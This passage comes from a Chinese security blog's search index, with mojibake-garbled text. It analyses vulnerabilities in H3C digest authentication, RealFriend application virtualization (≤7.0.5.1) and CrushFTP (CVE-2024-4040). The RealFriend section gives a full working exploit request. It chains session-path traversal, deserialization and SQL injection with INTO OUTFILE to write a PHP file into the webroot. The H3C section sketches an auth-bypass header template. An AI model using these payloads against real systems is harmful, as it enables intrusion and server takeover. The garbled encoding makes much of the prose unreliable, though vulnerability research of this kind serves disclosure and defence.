&amp;&amp; !var4) &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Digest comparison failure; trying to refresh user from DAO in case password had changed&quot;); &#125; try &#123; var26 = this.f.loadUserByUsername(var6); &#125; catch (UsernameNotFoundException var20) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.usernameNotFound&quot;, new Object[]&#123;var6&#125;, &quot;Username &#123;0&#125; not found&quot;)))); &#125; this.e.putUserInCache(var26); var14 = a(this.g, var6, var7, var26.getPassword(), var1.getMethod(), var9, var11, var8, var12, var25); &#125; if (!var14.equals(var10) &amp;&amp; !var4) &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Expected response: &#x27;&quot; + var14 + &quot;&#x27; but received: &#x27;&quot; + var10 + &quot;&#x27;; is AuthenticationDao returning clear text passwords?&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.incorrectResponse&quot;, &quot;Incorrect response&quot;)))); return false; &#125; else if (var18 &lt; System.currentTimeMillis()) &#123; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new NonceExpiredException(this.messages.getMessage(&quot;DigestAuthenticationFilter.nonceExpired&quot;, &quot;Nonce has expired/timed out&quot;)))); return false; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;Authentication success for user: &#x27;&quot; + var6 + &quot;&#x27; with response: &#x27;&quot; + var10 + &quot;&#x27;&quot;); &#125; UsernamePasswordAuthenticationToken var23; if (this.h) &#123; var23 = new UsernamePasswordAuthenticationToken(var26, var26.getPassword(), var26.getAuthorities()); &#125; else &#123; var23 = new UsernamePasswordAuthenticationToken(var26, var26.getPassword()); &#125; var23.setDetails(this.c.buildDetails(var1)); SecurityContextHolder.getContext().setAuthentication(var23); if (var1.getSession() != null) &#123; var1.getSession().setAttribute(&quot;loginName&quot;, var6); &#125; return true; &#125; &#125; &#125; &#125; &#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;extracted nc: &#x27;&quot; + var12 + &quot;&#x27;; cnonce: &#x27;&quot; + var25 + &quot;&#x27;&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.missingAuth&quot;, new Object[]&#123;var3&#125;, &quot;Missing mandatory digest value; received header &#123;0&#125;&quot;)))); return false; &#125;&#125; else &#123; if (a.isDebugEnabled()) &#123; a.debug(&quot;extracted username: &#x27;&quot; + var6 + &quot;&#x27;; realm: &#x27;&quot; + var6 + &quot;&#x27;; nonce: &#x27;&quot; + var6 + &quot;&#x27;; uri: &#x27;&quot; + var6 + &quot;&#x27;; response: &#x27;&quot; + var6 + &quot;&#x27;&quot;); &#125; this.a((HttpServletRequest)var1, (HttpServletResponse)var2, (AuthenticationException)(new BadCredentialsException(this.messages.getMessage(&quot;DigestAuthenticationFilter.missingMandatory&quot;, new Object[]&#123;var3&#125;, &quot;Missing mandatory digest value; received header &#123;0&#125;&quot;)))); return false;&#125;&#125; æ ¹æ®digestè®¤è¯çš„è®¤è¯è¿‡ç¨‹ï¼Œä¸éš¾å¾—å‡ºåˆ©ç”¨çš„æµç¨‹ 121. è®¿é—®backUpFromCasserverç«¯ç‚¹ï¼ŒæœåŠ¡å™¨å‘é€ä¸´æ—¶çš„è´¨è¯¢ç 2. æ ¹æ®è´¨è¯¢ç è®¡ç®—å‡ºå“åº”ç å¹¶å‘é€ç»™æœåŠ¡ç«¯æ ¡éªŒ è€Œæ ¹æ®ä»£ç å³å¯å¾—å‡ºPayloadçš„æ„é€  1Authorization: Digest username=&quot;admin&quot;, realm=&quot;VMC RESTful Web Services&quot;, nonce=&quot;xxxxx&quot;, uri=&quot;/cas/xxxxx&quot;, response=&quot;xxxxxx&quot;, qop=auth, nc=xxxx, cnonce=&quot;xxxxx&quot;, algorithm=xxxx æœ€ç»ˆé€šè¿‡backUpFromCasserverç«¯ç‚¹å³å¯è·å–Cookieèº«ä»½ä¿¡æ¯ æ–‡ä»¶ä¸Šä¼ ä¸å…¨ç»™å‡ºæ‰€æœ‰ç»†èŠ‚äº†(çœ‹æ–‡ç« æ€»éœ€è¦å¤šè‡ªå·±æ€è€ƒ)ï¼Œä¸Šä¼ çš„è·¯ç”±å¯ä»¥è‡ªå·±å»æ‰¾æ‰¾ï¼Œç»™ä¸ªæç¤º è€Œè¿™ä¸ªå‡½æ•°åœ¨è¿”å›è·¯å¾„æ—¶ç›´æ¥åšäº†è·¯å¾„çš„æ‹¼æ¥ 12345678910111213141516public static File getTokenedFile(String var0) throws IOException &#123; if (var0 != null &amp;&amp; !var0.isEmpty()) &#123; File var1; if (!(var1 = new File(&quot;/vms/tmptemplet/&quot; + File.separator + var0)).getParentFile().exists()) &#123; var1.getParentFile().mkdirs(); &#125; if (!var1.exists()) &#123; var1.createNewFile(); &#125; return var1; &#125; else &#123; return null; &#125;&#125; å› æ­¤å®Œæ•´çš„åˆ©ç”¨ä¹Ÿå°±åˆ†æå‡ºäº†ï¼Œç”±äºæ²¡æœ‰ç¯å¢ƒï¼Œä»¥ä¸Šåˆ†æä»…ä½œå‚è€ƒ","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"H3C","slug":"H3C","permalink":"https://y4tacker.github.io/tags/H3C/"}]},{"title":"æµ…æç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿå‰å°ååºåˆ—åŒ–(V<=7.0.5.1)","slug":"year/2024/5/æµ…æç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œ","date":"2024-05-07T03:35:52.000Z","updated":"2024-05-29T15:33:08.000Z","comments":true,"path":"2024/05/07/year/2024/5/æµ…æç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿè¿œç¨‹ä»£ç æ‰§è¡Œ/","link":"","permalink":"https://y4tacker.github.io/2024/05/07/year/2024/5/%E6%B5%85%E6%9E%90%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"æµ…æç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–ç³»ç»Ÿå‰å°ååºåˆ—åŒ–(V&lt;=7.0.5.1)çœ‹åˆ°åº”æ€¥å…¬å‘Šç®€å•åˆ†æå­¦ä¹ ä¸€æ³¢ï¼Œæ¼æ´ä¸ç®—éš¾ï¼Œä»£ç ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œæœ‰äº›ç»†èŠ‚è¿˜æ˜¯è›®æœ‰æ„æ€ï¼Œç®—æ˜¯æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œé¡ºä¾¿ä¹Ÿæ¡èµ·ä¸€äº›å¾ˆä¹…æ²¡ç¢°çš„PHPçŸ¥è¯† é‰´æƒè¿™ä¸ªç³»ç»Ÿæ–‡ä»¶ä¸å¤šï¼ŒåŠŸèƒ½ç‚¹å¤§å¤šæ˜¯éœ€è¦ç™»å½•ï¼Œæˆ‘ä»¬å¯ä»¥é‡ç‚¹å…³æ³¨ä¸€ä¸‹é‰´æƒéƒ¨åˆ†ï¼Œåœ¨ä¸ºæ•°ä¸å¤šçš„æ§åˆ¶å™¨å½“ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨admin/indexä¸¤ä¸ªæ§åˆ¶å™¨ä¸­éƒ¨åˆ†åŠŸèƒ½ç‚¹éƒ½å­˜åœ¨å¯¹äºç™»å½•ç”¨æˆ·çš„åˆ¤æ–­ï¼Œåˆ†åˆ«å¯¹åº”å‡½æ•°checkloginä¸adminchecklogin(Psï¼šåœ¨é«˜ç‰ˆæœ¬ä¸­åªæœ‰AdminCtrolleræ§åˆ¶å™¨æ–‡ä»¶äº†ï¼Œæ­¦å™¨åŒ–ä¹Ÿä»¥è¿™ä¸ªä¸ºå‡†) åœ¨è¿™é‡Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°sqlæŸ¥è¯¢ä¸ºæ‹¼æ¥çš„å½¢å¼ï¼ŒuserIdå‚æ•°æ¥æºäºsessionå­˜å‚¨æ–‡ä»¶çš„ååºåˆ—åŒ– IndexController#checklogin 12345678910111213141516171819202122232425private function checklogin()&#123; $mUser = M(&#x27;cuser&#x27;); $sessionpath = session_save_path(); $pathName = $this-&gt;openpath($sessionpath); $path = $_REQUEST[&#x27;sessId&#x27;] ? ($sessionpath . &quot;/sess_&quot; . $_REQUEST[&#x27;sessId&#x27;]) : ($sessionpath . &quot;/&quot; . $pathName[&#x27;name&#x27;][0]); $content = file_get_contents($path); $tmp = explode(&quot;|&quot;, $content); $tmp3 = unserialize($tmp[3]); $userId = $tmp3[&#x27;user_id&#x27;]; $cuser = $mUser-&gt;where(&quot;user_id=&#x27;&#123;$userId&#125;&#x27; AND is_group=0 AND is_admin !=1&quot;)-&gt;find(); if (sizeof($cuser) &gt; 0) &#123; $_SESSION[&#x27;UserInfo&#x27;] = $cuser; $_SESSION[&#x27;sessId&#x27;] = $_REQUEST[&#x27;sessId&#x27;]; $this-&gt;assign(&#x27;sessId&#x27;, $_REQUEST[&#x27;sessId&#x27;]); return true; &#125; if ($_SESSION[&#x27;LonginSucceed&#x27;] == false) &#123; //å°šæœªç™»å½• $this-&gt;login(); //$this-&gt;redirect(&#x27;index&#x27;); return false; &#125; else &#123; return true; &#125;&#125; AdminController#checklogin 12345678910111213141516171819202122232425262728293031323334353637383940private function adminchecklogin()&#123; $mUser = M(&#x27;cuser&#x27;); $sessionpath = session_save_path(); $pathName = $this-&gt;openpath($sessionpath); $path = $sessionpath . &quot;/sess_&quot; . $_REQUEST[&#x27;sessId&#x27;]; $content = file_get_contents($path); $tmp = explode(&quot;OverDo&quot;, $content); if (count($tmp) &gt; 1) &#123; $temporary = explode(&quot;|&quot;, $content); $tmp6 = unserialize($temporary[7]); if (!$tmp6) &#123; $tmp6 = unserialize($temporary[1]); &#125; &#125; else &#123; $tmp = explode(&quot;|&quot;, $content); $tmp6 = unserialize($tmp[6]); &#125; $userId = $tmp6[&#x27;user_id&#x27;]; $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] = $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] ? $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] : $userId; $cuser = $mUser-&gt;where(&quot;user_id=&#x27;&#123;$_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;]&#125;&#x27; AND is_group=0 AND is_admin=1&quot;)-&gt;find(); if (sizeof($cuser) &gt; 1 &amp;&amp; $cuser[&#x27;is_admin&#x27;] == 1) &#123; $_SESSION[&#x27;AdminLonginSucceed&#x27;] = true; $_SESSION[&#x27;Is_Admin&#x27;] = $cuser[&#x27;is_admin&#x27;]; $_SESSION[&#x27;AdminUserInfo&#x27;] = $InfoLogin[&#x27;AdminUserInfo&#x27;] = $cuser; $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;name&#x27;] = $cuser[&#x27;name&#x27;]; $this-&gt;assign(&#x27;sessId&#x27;, $_REQUEST[&#x27;sessId&#x27;]); $this-&gt;assign(&#x27;Admin&#x27;, $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;name&#x27;]); &#125; if ($_SESSION[&#x27;AdminLonginSucceed&#x27;] &amp;&amp; $_SESSION[&#x27;Is_Admin&#x27;] &amp;&amp; $cuser != NULL) &#123; return true; &#125; else &#123; //å°šæœªç™»å½• $this-&gt;login(); //$this-&gt;redirect(&#x27;index&#x27;); $_SESSION[&#x27;AdminLonginSucceed&#x27;] = false; $_SESSION[&#x27;Is_Admin&#x27;] = false; return false; &#125;&#125; åˆ©ç”¨æ–¹å¼å¤§è‡´ä¸€è‡´ï¼Œä½†Admincontrollerä¸IndexControlleråœ¨åˆ©ç”¨ä¸Šä»æœ‰äº›è®¸å·®åˆ«ï¼Œå‰è€…åˆ©ç”¨ä¸­å¤šäº†å¦‚ä¸‹ä»£ç ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœç¬¬ä¸€æ¬¡æ‰“æˆåŠŸäº†ï¼ŒuserIdåˆ™ä¼šè¢«è®°å½•ï¼Œç¬¬äºŒæ¬¡åˆ©ç”¨æ—¶å¦‚æœéœ€è¦æ›´æ”¹Payloadåªéœ€æŠŠcookieä¸­PHPSESSIDåšä¸ªä¿®æ”¹å³å¯ 1$_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] = $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] ? $_SESSION[&#x27;AdminUserInfo&#x27;][&#x27;user_id&#x27;] : $userId; å¤±è´¥çš„sessionæ§åˆ¶åˆ©ç”¨å°è¯•phpä¸­çš„sessionå­˜åœ¨å¤šç§å­˜å‚¨æ–¹å¼ï¼Œé€šè¿‡cookieã€æ–‡ä»¶ã€æ•°æ®åº“ç­‰æ–¹å¼å‡å¯ï¼Œå­˜å‚¨çš„æ ¼å¼ä¹Ÿæœ‰å¤šç§ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–æ•°ç»„ php é”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+serialize()å‡½æ•°åºåˆ—åŒ–çš„å€¼ æ¥ä¸‹é‡Œæˆ‘ä»¬æŸ¥çœ‹ç³»ç»Ÿä¸­å…³äºsessionçš„é…ç½®ï¼Œä¸éš¾å‘ç°ï¼Œå­˜å‚¨æ–¹å¼æ˜¯é€šè¿‡æ–‡ä»¶ï¼Œä¿å­˜åœ¨RealFriend\\Rap Server\\Temp\\PhpSessionè·¯å¾„ä¸‹ï¼Œä¸”å­˜å‚¨æ ¼å¼ä¸ºphp 12345678910111213[Session]session.save_handler = files;session.save_path = &quot;C:\\Windows\\Temp&quot;session.save_path =&quot;C:\\Program Files (x86)\\RealFriend\\Rap Server\\Temp\\PhpSession&quot;session.use_cookies = 1session.cookie_secure = 0session.name = PHPSESSIDsession.auto_start = 0session.cookie_lifetime = 0session.cookie_path = /session.cookie_domain =session.cookie_httponly = Truesession.serialize_handler = php å…³äºsessionçš„å·¥ä½œåŸç†å°±ä¸å†èµ˜è¿°ç½‘ä¸Šç›¸å…³èµ„æ–™ä¹Ÿå¾ˆå¤šäº† çŸ¥é“äº†è¿™äº›ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¾¿å¯ä»¥æ€è€ƒå¦‚ä½•æ§åˆ¶è¿™ä¸ªsessionæ–‡ä»¶(é€šè¿‡å¯¹sessionæ“ä½œèµ‹å€¼)ï¼Œè¿™ä¸ªè¿‡ç¨‹éå¸¸ç›´æ¥ï¼Œå› æ­¤æˆ‘ä»¬ç¬¬ä¸€ä¸ªå¾ˆå®¹æ˜“æƒ³åˆ°åœ¨ç™»å½•çš„è¿‡ç¨‹ åœ¨ä¸‹é¢çš„æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°èµ‹å€¼éƒ¨åˆ†èƒ½æ§åˆ¶çš„æœ‰nameã€pwdã€loginPwdã€languageç­‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?phpinclude &quot;ConDB.XGI&quot;;include &quot;LicenceInfo.XGI&quot;;include &quot;Lg.XGI&quot;;include &quot;Common.XGI&quot;;include &quot;Function.XGI&quot;;include &quot;converter.XGI&quot;;$ErrID = 1;if (!isset($_SESSION)) &#123; session_start();&#125;$COMCASWEB = new main();if (!isset($_REQUEST[&#x27;cmd&#x27;]) &amp;&amp; $_REQUEST[&#x27;cmd&#x27;] == &quot;&quot;) &#123; if (isset($_SESSION[&#x27;UserName&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;UserName&#x27;])) &#123; &#125; if ($GLOBALS[&#x27;_SESSION&#x27;][&#x27;LonginSucceed&#x27;]) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_REQUEST&#x27;][&#x27;DirID&#x27;] = &quot;NULL&quot;; &#125; else &#123; session_unset(); &#125;&#125;$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;MainXGI&#x27;] = $_SERVER[&#x27;PHP_SELF&#x27;];$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;Embed&#x27;] = FALSE;$GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;salt&#x27;] = getClientLoginMd5Salt();if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; $_GET[&#x27;cmd&#x27;] == &quot;UserLogin&quot;) &#123; $RedURL = $_SERVER[&#x27;PHP_SELF&#x27;]; header(&quot;Location: &quot; . $RedURL); exit;&#125;if (isset($_REQUEST[&#x27;cmd&#x27;]) &amp;&amp; $_REQUEST[&#x27;cmd&#x27;] == &quot;UserLogin&quot;) &#123; $_REQUEST[&#x27;name&#x27;]=trim(filter_inputXssKeyWord($_REQUEST[&#x27;name&#x27;])); $_REQUEST[&#x27;pwd&#x27;]=(filter_inputXssKeyWord($_REQUEST[&#x27;pwd&#x27;])); $_REQUEST[&#x27;loginPwd&#x27;]=trim(filter_inputXssKeyWord($_REQUEST[&#x27;loginPwd&#x27;])); $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;loginPwd&#x27;]=$_REQUEST[&#x27;loginPwd&#x27;]; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;PWD&#x27;] = $_REQUEST[&#x27;pwd&#x27;]; if (inject_check($_REQUEST[&#x27;name&#x27;]) || inject_check($_REQUEST[&#x27;pwd&#x27;])) &#123; $RedURL = $_SERVER[&#x27;PHP_SELF&#x27;]; header(&quot;Location: &quot; . $RedURL); exit; &#125; if (isset($_REQUEST[&#x27;language&#x27;]) &amp;&amp; $_REQUEST[&#x27;language&#x27;] != &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = strtoupper($_REQUEST[&#x27;language&#x27;]);&#125; else &#123;&#125;if (!isset($_SESSION[&#x27;LanguageName&#x27;]) &amp;&amp; $_SESSION[&#x27;LanguageName&#x27;] == &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = strtoupper($_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;]); if (similar_text($_SESSION[&#x27;LanguageName&#x27;], &quot;ZH-CN&quot;) == 5) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-CN&quot;; &#125; else &#123; if (similar_text($_SESSION[&#x27;LanguageName&#x27;], &quot;ZH-TW&quot;) == 5) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-TW&quot;; &#125; else &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;EN&quot;; &#125; &#125;&#125;if ($_SESSION[&#x27;LanguageName&#x27;] == &quot;&quot;) &#123; $GLOBALS[&#x27;GLOBALS&#x27;][&#x27;_SESSION&#x27;][&#x27;LanguageName&#x27;] = &quot;ZH-CN&quot;;&#125; ä½†å¾ˆå¯æƒœä¸€çœ¼èƒ½çœ‹åˆ°è¿‡æ»¤å‡½æ•°ä¸­æŠŠ&#39;å•å¼•å·åˆ é™¤äº†ï¼Œå› æ­¤å®é™…åˆ©ç”¨æ—¶ä¸èƒ½åšåˆ°æ‰§è¡Œçš„é€ƒé€¸ 12345678function filter_inputXssKeyWord($str)&#123; $str = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, preg_replace( &quot;/&lt;(.*)a(.*)l(.*)e(.*)r(.*)t/i&quot;, &quot;&quot;, $str)); $str=str_ireplace(&quot;and&quot;, &quot;&quot;, preg_replace( &quot;/&lt;(.*)a(.*)n(.*)d/i&quot;, &quot;&quot;,$str)); $str=str_ireplace(&quot;&#x27; &#x27;f&#x27;=&#x27;&quot;, &quot;&quot;, str_ireplace(&quot;OR&quot;, &quot;&quot;, $str)); $str=str_ireplace(&quot;+&quot;, &quot;&quot;, str_ireplace(&quot;&#x27;&quot;, &quot;&quot;, $str)); return $str;&#125; å”¯ä¸€æ²¡èµ°è¿‡æ»¤çš„åªæœ‰languageç›¸å…³å‚æ•°ï¼Œä½†å¾ˆå¯æƒœå›é¡¾ä¹‹å‰çš„ååºåˆ—åŒ–éƒ¨åˆ†è¦æ±‚ä½ç½®å¤ªè¿‡äºé å‰ï¼Œå¦ä¸€ä¸ªadminæ§åˆ¶å™¨çš„åˆ™åœ¨ç¬¬ä¸ƒä½ï¼Œä»…æœ‰å‚æ•°Pwdåœ¨å­˜å‚¨æ–‡ä»¶æŒ‰|åˆ†å‰²åœ¨ç¬¬äº”ä½ï¼Œèƒ½é€šè¿‡å†™å…¥|å®ç°ååºåˆ—åŒ–payloadçš„æ§åˆ¶ï¼Œä½†å¾ˆå¯æƒœæ— æ³•é€ƒé€¸å•å¼•å·çš„åˆ©ç”¨ 12$tmp = explode(&quot;|&quot;, $content);$tmp3 = unserialize($tmp[3]); æŸ³æš—èŠ±æ˜åˆä¸€æ‘ç¬¬äºŒå¤©å†™å®Œåšå®¢åƒé¥­æœŸé—´ï¼Œç»è¿‡ataoçš„æç¤ºæˆ‘åˆå»çœ‹äº†ä¸€ä¸‹phpçš„é…ç½®ï¼Œä¸çœ‹ä¸çŸ¥é“ï¼Œä¸€çœ‹å“ä¸€è·³(æ‰€ä»¥è¯´æœ‰æ—¶å€™ä¸è¦å…‰çœ‹é…ç½®æ–‡ä»¶.iniçš„å†…å®¹ï¼Œè¿˜æ˜¯phpinfoé‡Œçš„ä¿¡æ¯æ›´ä¸ºç›´è§‚) è¿™ä¸å°±æ˜¯ä»¥å‰CTFçš„åˆ©ç”¨session.upload_progressåšæ¡ä»¶ç«äº‰å†™æ–‡ä»¶ä¹ˆï¼Ÿç»è¿‡æµ‹è¯•ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ï¼Œè¿™æ–¹é¢çŸ¥è¯†ç‚¹é—å¿˜çš„ å¯ä»¥çœ‹çœ‹ä»¥å‰çš„è€æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸å½“æ¬è¿å·¥äº†ï¼Œåˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€ é€šè¿‡PHP_SESSION_UPLOAD_PROGRESSçš„åˆ©ç”¨ï¼Œå°†ååºåˆ—åŒ–æ•°æ®æ”¾åœ¨filenameå½“ä¸­å³å¯å®ç°æ›´ç¨³å®šçš„åˆ©ç”¨ï¼Œç›®å‰æ¥çœ‹ä¸‰ç§åˆ©ç”¨æ–¹å¼é‡Œé¢è¿™ä¸ªæœ€ä½³ PHPä¸´æ—¶æ–‡ä»¶å¦ä¸€ä¸ªèƒ½æƒ³åˆ°çš„å°±æ˜¯ä¹‹å‰æ‰“ctfçš„è€å§¿åŠ¿ä¸´æ—¶æ–‡ä»¶åŒ…å«äº†ï¼Œé…åˆä¸Šwindowsçš„é€šé…ç¬¦ å¿˜äº†çš„å¯ä»¥çœ‹çœ‹è¿œå¤æ–‡ç« https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/ æŸ¥çœ‹ç³»ç»Ÿå…·ä½“é…ç½®ï¼Œå¯ä»¥çœ‹åˆ°ç¼“å­˜æ–‡ä»¶åœ¨é»˜è®¤è·¯å¾„ä¸‹ 12345file_uploads = Onupload_tmp_dir = &quot;C:\\Windows\\Temp&quot;upload_max_filesize = 32Mmax_file_uploads = 20allow_url_fopen = On é€šè¿‡æŸ¥çœ‹é…ç½®æ–‡ä»¶ä¸éš¾å‘ç°ä¸´æ—¶æ–‡ä»¶åœ¨é»˜è®¤çš„C:\\Windows\\Tempä¸‹ 123456789101112131415161718POST /hmrao.php?s=/Admin/title&amp;sessId=/../../../../../../Windows/Temp/php&lt;&lt; HTTP/1.1Host: Connection: closeCookie: PHPSESSID=aaabbbcccddefzzzzazzza; CookieLanguageName=EN; UserAuthtype=0Accept-Language: en-US,en;q=0.5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36Content-Type: multipart/form-data; boundary=------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKMAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1Accept-Encoding: gzip, deflate&#123;&#123;char(a-z)&#125;&#125;Content-Length: 188--------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKMContent-Disposition: form-data; name=&quot;file&quot;;filename=&quot;1.txt&quot;||||||a:1:&#123;s:7:&quot;user_id&quot;;s:310:&quot;y4test&#x27;) union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31, 0x003c3f7068702066696c655f7075745f636f6e74656e7473282779347461636b65722e706870272c273c3f706870206563686f28224861636b65642042792059347461636b657222293b27293b3f3e into outfile &#x27;../../WebRoot/y4tacker.php&#x27;#&quot;;&#125;|||--------------------------wHKGQZyLwKYaYTdizteSYGbJvzMyKPIUBukyzTKM-- ä¸€å‘å…¥é­‚æ‰“ä¸€æ³¢ ä½†ä»ç„¶å­˜åœ¨ä¸€å®šé—®é¢˜ï¼Œå‡å¦‚æˆ‘ä»¬çš„å®‰è£…ç›®å½•ä¸åœ¨é»˜è®¤çš„Cç›˜ï¼Œé‚£ä¹ˆç›®å½•ç©¿è¶Šä¸èƒ½è·¨è¶Šç›˜ç¬¦åšè¯»å–ï¼Œé‚£è¿™æ—¶å€™åˆè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ ThinkPHPæ—¥å¿—åŒ…å«å°½ç®¡å®‰è£…è·¯å¾„ä¸ä¸€å®šåœ¨Cç›˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜èƒ½ä»ä»€ä¹ˆæ–¹å‘æ€è€ƒå‘¢ï¼Œæœ‰æƒ…æˆ‘ä»¬çš„è€æ¼”å‘˜TPï¼Œå®ƒçš„æ—¥å¿—æ€»ä¼šåœ¨é¡¹ç›®è·¯å¾„ä¸‹å§(RealFriend\\Rap Server\\WebRoot\\casweb\\Runtime\\Logs\\Home) åªè¦èƒ½è®©é¡¹ç›®æŠ¥é”™å°±èƒ½ä¿å­˜æ—¥å¿—ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯ç”±è§¦å‘æ—¥å¿—å³å¯å°†payloadå†™å…¥(æ³¨æ„å¤„ç†ç©ºæ ¼çš„é—®é¢˜ï¼Œ#ç¬¦å·ä¹Ÿè¦æ›¿æ¢ï¼Œé—­åˆè¯­å¥å³å¯)","categories":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"}]},{"title":"CrushFTPååˆ©ç”¨ææƒåˆ†æ(CVE-2024-4040)","slug":"year/2024/4/CrushFTPååˆ©ç”¨ææƒåˆ†æ-CVE-2024-4040","date":"2024-04-25T11:49:41.000Z","updated":"2024-04-25T13:57:12.000Z","comments":true,"path":"2024/04/25/year/2024/4/CrushFTPååˆ©ç”¨ææƒåˆ†æ-CVE-2024-4040/","link":"","permalink":"https://y4tacker.github.io/2024/04/25/year/2024/4/CrushFTP%E5%90%8E%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90-CVE-2024-4040/","excerpt":"","text":"CrushFTPååˆ©ç”¨ææƒåˆ†æ(CVE-2024-4040)å†™åœ¨å‰é¢è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æœ€ç»ˆè¿˜æ˜¯è¢«æ›å…‰äº†ï¼Œè¿™é‡Œä¹Ÿä¸åšé‡å¤çš„åˆ†æï¼Œå…·ä½“å¯ä»¥ç‚¹å‡»è®¿é—®CVE-2024-4040äº†è§£æ¼æ´çš„è¯¦æƒ…ï¼Œåœ¨è¿™é‡Œä½œè€…åœ¨åˆ†æåˆ©ç”¨çš„æ—¶å€™ä»ç„¶ä½¿ç”¨çš„sessions.objæ–‡ä»¶å»è¯»å–å†å²cookieå†åšææƒçš„å°è¯•ï¼Œä½†åœ¨æœ€æ—©çš„ä¸€ç¯‡æ–‡ç« å½“ä¸­æˆ‘ä¹Ÿæ›¾æåˆ°è¿‡ï¼Œåªæœ‰åœ¨ç¨‹åºé€€å‡ºæ—¶æ‰ä¼šç”Ÿæˆè¿™æ 